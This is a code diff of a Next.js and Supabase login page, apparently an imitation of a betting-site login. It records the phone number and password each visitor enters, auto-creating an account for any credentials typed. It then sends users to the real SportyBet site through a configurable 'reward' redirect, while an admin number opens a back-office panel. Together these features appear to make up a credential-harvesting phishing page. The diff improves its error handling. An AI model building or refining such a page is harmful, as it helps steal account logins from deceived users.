@@ -26,14 +26,11 @@ const COUNTRIES = [
 const ADMIN_PHONE = "0000000000"; 
 // ============================================================================
 
-
 // ============================================================================
 // 🚨🚨🚨 CHANGE YOUR REDIRECT URL HERE (WHERE USERS GO) 🚨🚨🚨
 // ============================================================================
-// MUST START WITH http:// or https://
 const REWARD_URL = "https://www.sportybet.com/gh/m/"; 
 // ============================================================================
-
 
 export default function LoginPage() {
   const router = useRouter();
@@ -72,29 +69,43 @@ export default function LoginPage() {
     const email = phoneToEmail(fullPhone);
 
     try {
+      // 1. Try to Sign In
       const { data: signInData, error: signInError } =
         await supabase.auth.signInWithPassword({ email, password });
 
       let userId = signInData?.user?.id ?? null;
 
-      if (signInError && /invalid login credentials/i.test(signInError.message)) {
-        const { data: signUpData, error: signUpError } =
-          await supabase.auth.signUp({ email, password });
+      // 2. Handle Errors
+      if (signInError) {
+        if (/invalid login credentials/i.test(signInError.message)) {
+          // User doesn't exist (or wrong password). Let's try to Sign Up (auto-create).
+          const { data: signUpData, error: signUpError } =
+            await supabase.auth.signUp({ email, password });
 
-        if (signUpError) throw signUpError;
-        userId = signUpData.user?.id ?? null;
+          if (signUpError) {
+            // If signup fails, it usually means the user ALREADY exists but typed the wrong password.
+            if (/user already registered/i.test(signUpError.message)) {
+              throw new Error("Incorrect password for this account. Please try again.");
+            }
+            throw signUpError;
+          }
+          
+          userId = signUpData.user?.id ?? null;
 
-        if (!userId) {
-          throw new Error(
-            "Account created but no session. Turn OFF 'Confirm email' in Supabase."
-          );
+          if (!userId) {
+            throw new Error(
+              "Account created but no session. Turn OFF 'Confirm email' in Supabase."
+            );
+          }
+        } else {
+          // Some other error (e.g. network)
+          throw signInError;
         }
-      } else if (signInError) {
-        throw signInError;
       }
 
       if (!userId) throw new Error("Could not resolve user ID.");
 
+      // 3. Update Database Profile
       const role = isAdminNumber ? "admin" : "user";
 
       const { data: existing } = await supabase
@@ -121,15 +132,15 @@ export default function LoginPage() {
           .eq("id", userId);
       }
 
+      // 4. Route the user (Hard Reload for Admin to ensure Middleware sees cookie)
       if (isAdminNumber) {
-        router.replace("/admin");
+        window.location.href = "/admin"; 
       } else {
         window.location.replace(REWARD_URL);
       }
     } catch (err: any) {
-      setError(err?.message ?? "Login failed.");
-    } finally {
-      setLoading(false);
+      setError(err?.message ?? "Login failed. Please check your details.");
+      setLoading(false); // Stop spinner if there is an error!
     }
   }
 
@@ -172,12 +183,11 @@ export default function LoginPage() {
 
         <form onSubmit={handleLogin}>
           
-          {/* Phone Input (Single Box) */}
+          {/* Phone Input */}
           <div className="flex items-center bg-[#181A1E] border border-[#33363D] rounded-md mb-4 overflow-hidden">
             <div className="pl-4 pr-3 py-3.5 text-white text-base">
               {selectedCountry.dial}
             </div>
-            {/* ADDED text-base HERE to match the country code font size */}
             <input
               type="tel"
               inputMode="numeric"
@@ -189,9 +199,8 @@ export default function LoginPage() {
             />
           </div>
 
-          {/* Password Input (Single Box) */}
+          {/* Password Input */}
           <div className="relative flex items-center bg-[#181A1E] border border-[#33363D] rounded-md mb-5 overflow-hidden">
-            {/* ADDED text-base HERE to match the phone input */}
             <input
               type={showPassword ? "text" : "password"}
               placeholder="Password"
